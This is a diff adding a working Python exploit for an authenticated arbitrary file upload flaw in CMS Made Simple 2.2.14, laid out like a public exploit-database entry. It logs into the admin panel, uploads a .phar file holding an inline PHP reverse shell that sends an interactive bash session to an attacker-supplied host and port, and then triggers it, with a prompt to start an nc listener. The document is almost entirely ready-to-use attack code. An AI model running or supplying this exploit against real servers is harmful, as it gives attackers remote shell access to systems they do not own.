@@ -1,0 +1,63 @@
+#!/usr/bin/python3
+#-*- coding: utf-8 -*-
+
+# Exploit Title: CMS Made Simple 2.2.14 - Arbitrary File Upload (Authenticated)
+# Google Dork: N/A
+# Date: 2020-08-31
+# Exploit Author: Luis Noriega (@nogagmx)
+# Vendor Homepage: https://www.cmsmadesimple.org/
+# Software Link: http://s3.amazonaws.com/cmsms/downloads/14793/cmsms-2.2.14-install.zip
+# Version: 2.2.14
+# Tested on: Linux Ubuntu 18.04.4 LTS
+# CVE : N/A
+
+# Usage:
+# python3 exploit.py --url http://URL/cmsms/admin/login.php -u admin -p password -lhost LHOST -lport LPORT
+
+from urllib.parse import urlparse
+import requests
+import argparse
+import string
+import random
+import json
+import sys
+
+def parse_url(URL):
+	t = urlparse(URL)
+	return t.scheme+'://'+t.netloc+t.path.split('login.php')[0] + 'moduleinterface.php'
+
+
+parser = argparse.ArgumentParser(description='CMS Made Simple 2.2.14 - Authenticated Arbitrary File Upload - PHP Reverse Shell')
+parser.add_argument('--url', dest='URL', help='URL to admin pane </admin/login.php>', required=True)
+parser.add_argument('-u', dest='USERNAME', help='Username', required=True)
+parser.add_argument('-p', dest='PASSWORD', help='Password', required=True)
+parser.add_argument('-lhost', dest='IP', help='The listen address', required=True)
+parser.add_argument('-lport', dest='PORT', help='The listen port', required=True)
+
+args = parser.parse_args()
+login_data = {'username':"", "password":"", "loginsubmit": "Submit"}
+PAYLOAD = '<?php set_time_limit (0); $VERSION = "1.0"; $ip = "%s"; $port = "%s"; $chunk_size = 1400; $write_a = null; $error_a = null; $shell = "uname -a; w; id; /bin/bash -i"; $daemon = 0; $debug = 0; if (function_exists("pcntl_fork")) { $pid = pcntl_fork(); if ($pid == -1) { printit("ERROR: Cannot fork"); exit(1); } if ($pid) { exit(0); } if (posix_setsid() == -1) { printit("Error: Cannot setsid()"); exit(1); } $daemon = 1; } else { printit("WARNING: Failed to daemonise.  This is quite common and not fatal."); } chdir("/"); umask(0); $sock = fsockopen($ip, $port, $errno, $errstr, 30); if (!$sock) { printit("$errstr ($errno)"); exit(1); } $descriptorspec = array(0 => array("pipe", "r"), 1 => array("pipe", "w"), 2 => array("pipe", "w")); $process = proc_open($shell, $descriptorspec, $pipes); if (!is_resource($process)) { printit("ERROR: Cannot spawn shell"); exit(1); } stream_set_blocking($pipes[0], 0); stream_set_blocking($pipes[1], 0); stream_set_blocking($pipes[2], 0); stream_set_blocking($sock, 0); printit("Successfully opened reverse shell to $ip:$port"); while (1) { if (feof($sock)) { printit("ERROR: Shell connection terminated"); break; } if (feof($pipes[1])) { printit("ERROR: Shell process terminated"); break; } $read_a = array($sock, $pipes[1], $pipes[2]); $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null); if (in_array($sock, $read_a)) { if ($debug) printit("SOCK READ"); $input = fread($sock, $chunk_size); if ($debug) printit("SOCK: $input"); fwrite($pipes[0], $input); } if (in_array($pipes[1], $read_a)) { if ($debug) printit("STDOUT READ"); $input = fread($pipes[1], $chunk_size); if ($debug) printit("STDOUT: $input"); fwrite($sock, $input); } if (in_array($pipes[2], $read_a)) { if ($debug) printit("STDERR READ"); $input = fread($pipes[2], $chunk_size); if ($debug) printit("STDERR: $input"); fwrite($sock, $input); } } fclose($sock); fclose($pipes[0]); fclose($pipes[1]); fclose($pipes[2]); proc_close($process); function printit ($string) {  if (!$daemon) { print "$string\n"; } } ?>'% (args.IP,args.PORT)
+FILENAME = ''.join(random.choice(string.ascii_lowercase + string.digits) for _ in range(5)) + '.phar'
+file = {'m1_files[]': (FILENAME, PAYLOAD)}
+upload_data = {"mact":"FileManager,m1_,upload,0", "__c":"", "disable_buffer":"1"}
+URL_UPLOAD = parse_url(args.URL)
+
+print("[ + ] Connection to the CMS Made Simple Admin Portal located at "+ args.URL)
+print("[ + ] Using "+ args.USERNAME +":"+ args.PASSWORD); login_data['username'] = args.USERNAME; login_data['password'] = args.PASSWORD
+
+try:
+	session = requests.session()
+	req = session.post(args.URL, data=login_data)
+	upload_data["__c"] = session.cookies["__c"]
+	print ("[ + ] %s logged successfully!"%(args.USERNAME))
+	response = requests.post(URL_UPLOAD, files=file, cookies=session.cookies,data=upload_data)
+	data = response.json()
+	print ("[ + ] %s file uploaded."%(FILENAME))
+	URL_TRIGGER = data[0]['url']
+	input("[ ! ] Set up your nc listener <nc -nvlp %s>, then press any to exploit.."%(args.PORT))
+	print ("[ + ] Pwned!!")
+	response = requests.get(URL_TRIGGER, cookies=session.cookies)
+	print ("[ + ] Bye")
+except:
+	print ("[ x ] Something went wrong, try again.")
+	sys.exit(1)
